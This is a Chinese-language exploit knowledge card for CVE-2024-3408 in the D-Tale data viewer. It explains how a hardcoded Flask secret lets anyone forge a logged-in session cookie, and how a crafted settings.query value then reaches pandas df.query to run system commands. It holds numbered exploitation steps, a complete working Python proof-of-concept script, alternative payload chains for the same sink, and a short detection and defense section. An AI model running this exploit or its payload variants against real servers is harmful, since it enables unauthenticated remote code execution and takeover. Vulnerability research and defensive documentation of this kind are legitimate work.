---
id: web-python-framework-dtale-hardcoded-secret-session-settings-query-rce
title: D-Tale 硬编码 SECRET_KEY 伪造 Flask 会话 + settings.query 落盘，经 run_query 的 df.query 执行代码（CVE-2024-3408）
type: scenario
domain: web
path: web/python/framework
technique: flask-session-forgery-settings-query-pandas-rce
aliases:
- CVE-2024-3408
- D-Tale RCE
- dtale SECRET_KEY 伪造 session
- df.query 命令执行
- pandas query eval RCE
- run_query 注入
tags:
- python
- flask
- dtale
- pandas
- session-forgery
- itsdangerous
- rce
- cve-2024-3408
cve:
- CVE-2024-3408
severity: critical
confidence: high
affected_versions: dtale 3.10.0（原文复现版本）；官方后续 commit 改为随机 secret
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W8
  verified_at: '2026-11-09T02:40:10+08:00'
  notes: '已对照原文核对：itsdangerous.URLSafeTimedSerializer 四参数（key Dtale、salt=cookie-session、key_derivation=hmac、digest_method=sha1）、dtale-3.10.0 的 app.py 硬编码 SECRET_KEY 与官方 commit 32bd6fb 改为 10 位随机 secret、run_query 的 df.query(query if is_pandas25 else query.replace(''\'',''''), local_dict=context_vars or {}, engine=engine)、链路 /upload → /update-settings/<data_id> → build_query/inner_build_query → run_query、触发路由 /data-export 与 /edit-cell、以及正文完整利用脚本（含 @pd.core.frame.com.builtins.__import__(''os'').system 与尾部 # 注释）均与原文一致。affected_versions 保留原文标注的 dtale 3.10.0（原文复现版本，并注明官方后续 commit 改随机 secret），原文未给出更精确区间，未改动。本次核对未读取图片；sessions.py/app.py/run_query 源码截图与执行结果截图未核对，故『实机弹计算器成功』未验证。dedup：t2_card 判 duplicate 但 top 为草稿自身（1.000），排除后最高外部候选 web-python-recursive-merge-class-pollution 0.098、jinja2-flask-session-forge 0.081 均非同链（前者 sink 为递归合并，后者仅共享会话伪造前置且落到 SSTI）'
---

## 一句话结论

D-Tale 把 Flask 的 `app.config["SECRET_KEY"]` 写死成固定字符串，于是任何人都能用 `itsdangerous.URLSafeTimedSerializer` 按同样的密钥/`salt`/`key_derivation`/`digest_method` 签出 `{"logged_in": true}` 的会话 cookie 直接跳过登录；随后上传一个任意 CSV 拿 `data_id`、用 `/update-settings/<data_id>` 把 `settings.query` 改成 `@pd.core.frame.com.builtins.__import__("os").system(...)`，再访问任一触发 `run_query` 的路由，查询串进入 `df.query(...)` 被当作 Python 表达式求值，命令就在服务端执行。

## 原理

- **会话为什么可伪造**：Flask 的 session 是客户端 cookie，由 `itsdangerous.URLSafeTimedSerializer` 用 `app.secret_key` 签名（默认 `salt="cookie-session"`、`key_derivation="hmac"`、`digest_method=sha1`）。密钥一旦是硬编码常量，"签名"就不再是秘密——攻击者本地用同样的四个参数就能生成服务端认可的任意会话内容。
- **为什么硬编码密钥足以接管**：D-Tale 把登录态存在 session 的 `logged_in`/`username` 字段里，鉴权只读这两个值；伪造 `logged_in: true` 即等价于已登录，无需知道任何口令。
- **为什么 `df.query` 能执行系统命令**：pandas 的 `DataFrame.query()` 用表达式求值后端（numexpr/python）解析查询串，`engine="python"` 时由 Python 直接 eval 该表达式；表达式中可访问 `@变量`（`local_dict` 注入的变量）与对象属性链，因此 `@pd.core.frame.com.builtins` 可一路走到内置函数 `__import__`，再调用 `os.system`——`df.query` 从来不是沙箱。
- **两段式的必要性**：query 值不是直接来自当前 HTTP 请求，而是先被 `/update-settings/<data_id>` 写进该 `data_id` 的全局 settings；之后任何走 `build_query → inner_build_query → run_query` 的路由（例如 `/data-export/<data_id>`、`/edit-cell/<data_id>`）都会把 settings 里的片段拼成完整查询并交给 `df.query`。这种"先落设置、后触发"的两段式让 payload 不落在真正执行的请求里，也便于反复触发。
- **为什么 `#` 注释很重要**：`inner_build_query` 会把多个查询片段拼接，payload 尾部用 `"""<cmd> #"""` 把后续拼接内容注释掉，保证最终表达式语法合法、命令只执行一次。
- **修复印证**：官方后续 commit 把固定的 `SECRET_KEY` 换成自定义的 10 位随机密钥，使会话 cookie 无法离线伪造——但 query 注入面本身仍需另行控制。

## 触发条件

- 目标运行受影响版本的 D-Tale（原文复现 `dtale-3.10.0`），且服务可访问（默认端口 40000，路径前缀 `/dtale`）。
- 目标使用硬编码默认密钥的构建（未自行覆盖 `SECRET_KEY` 或未升级到随机密钥版本）。
- 能向 `/upload` 上传文件以获得 `data_id`，并能调用 `/update-settings/<data_id>`（本文链路在伪造会话后两者均可用）。
- 目标能以 `engine="python"` 路径求值查询（pandas 版本相关：`is_pandas25` 为真时不替换反引号，否则会 `query.replace("`","")`，payload 里不要用反引号即可）。

## 利用步骤

1. 确认目标为 D-Tale（`/dtale` 前缀、`/dtale/upload` 等接口），并获取/推测其版本（默认密钥随版本固定）。
2. 本地用 `URLSafeTimedSerializer("Dtale", salt="cookie-session", signer_kwargs={"key_derivation":"hmac","digest_method":staticmethod(hashlib.sha1)})` 的 `dumps({"logged_in": True, "username": "whatever"})` 生成会话值。
3. 把该值设为 `session` cookie，请求 `/dtale/upload` 上传一个最小 CSV（如 `A,B\n1,1\n`），从响应 `data_id` 字段取出 id。
4. `GET /dtale/update-settings/<data_id>?settings=<urlquote(json)>`，其中 `settings={"query": "@pd.core.frame.com.builtins.__import__(\"os\").system(\"<cmd> #\")"}`。
5. 访问一个会调用 `run_query` 的路由（如 `/dtale/edit-cell/<data_id>` 或 `/data-export/<data_id>`）触发求值。
6. 用可观测副作用确认执行（写文件、反连、DNS 带外）；若命令含空格/引号，注意 URL 编码与尾部 `#` 注释。

## PoC

```python
import json, hashlib
from urllib.parse import quote
from requests import Session
from itsdangerous import URLSafeTimedSerializer

url_base = "http://target:40000/dtale"
cmd = "id"

# 1) 用硬编码密钥签出合法会话（salt/key_derivation/digest_method 均为 Flask 默认）
signer_kwargs = {"key_derivation": "hmac", "digest_method": staticmethod(hashlib.sha1)}
sess = URLSafeTimedSerializer("Dtale", salt="cookie-session",
                              signer_kwargs=signer_kwargs).dumps(
                                  {"logged_in": True, "username": "whatever"})

with Session() as s:
    s.cookies["session"] = sess
    # 2) 上传任意 DataFrame 取 data_id
    rsp = s.post(f"{url_base}/upload", files={"poc.csv": ("poc.csv", b"A,B\n1,1\n", "text/csv")})
    data_id = rsp.json()["data_id"]

    # 3) 把恶意 query 写进该 data_id 的 settings（尾部 # 注释掉后续拼接片段）
    settings = {"query": f'@pd.core.frame.com.builtins.__import__("os").system("""{cmd} #""")'}
    rsp = s.get(f"{url_base}/update-settings/{data_id}?settings={quote(json.dumps(settings))}")
    assert rsp.json()["success"]

    # 4) 访问会走 run_query 的路由触发 df.query 求值
    s.get(f"{url_base}/edit-cell/{data_id}")
```

```text
链路：URLSafeTimedSerializer(硬编码 key) → session
      /upload → data_id
      /update-settings/<data_id> → settings["query"] = 恶意表达式
      /edit-cell|/data-export/<data_id> → build_query → inner_build_query → run_query
      run_query → df.query(拼接后的 query, engine=python) → @pd...__import__("os").system(...) → RCE
```

## 变体与关联

- **同 sink 的其他写法**：`@pd.core.frame.com.builtins.eval("...")`、`@__builtins__["__import__"]("os")`、借助 `local_dict=context_vars` 注入的变量；只要 `df.query` 走 python 引擎，任何能触达内置的表达式链都可用。
- **鉴权绕过的其他形态**：Flask 应用硬编码 `SECRET_KEY` 的通用后果是会话伪造（改 `logged_in`、改 `username`、改角色字段）；同类问题也出现在硬编码 JWT 密钥（可自签任意 claims）与硬编码加密密钥（可伪造任意密文）的产品里。
- 关联：`[[web-python-framework-flask-werkzeug-debug-pin-forgery]]`（同属 Flask 应用"用可推导的密钥伪造信任"的家族，那条针对 debug console PIN）；`[[web-python-framework-flask-hook-registry-memshell]]` 等 Flask 家族卡为其内存马后续；RuoYi 系的表达式注入卡是 Java 侧的同类"用户输入进表达式求值"问题。
- 边界：目标若已升级到随机 secret 的版本，第一步签名即失效；若服务端强制 `engine="numexpr"` 或对 query 做白名单，`df.query` 链可能不可用；若 `/update-settings` 需要额外权限或 CSRF token，需先满足；容器内无外连时只能用写文件/延时确认。

## 检测与防御

- 检测：`session` cookie 无法对应任何真实登录事件（服务端登录日志缺失但出现高权限操作）；`/update-settings/<id>` 的 `settings` 参数中出现 `@`、`__import__`、`system`、`#`；随后紧跟 `/data-export`、`/edit-cell` 等导出/编辑请求；服务进程派生出 `sh`/`cmd` 等子进程。
- 防御：为每个实例生成随机 `SECRET_KEY` 并放入环境变量/密钥管理（这正是官方修复方向），禁止硬编码默认值；不要把用户可控字符串交给 `df.query`/`eval`/`exec`，查询构造改为白名单列名 + 参数化；对 `/update-settings`、`/upload` 增加鉴权与 CSRF；以低权限用户运行并以容器/沙箱限制派生进程与外连。
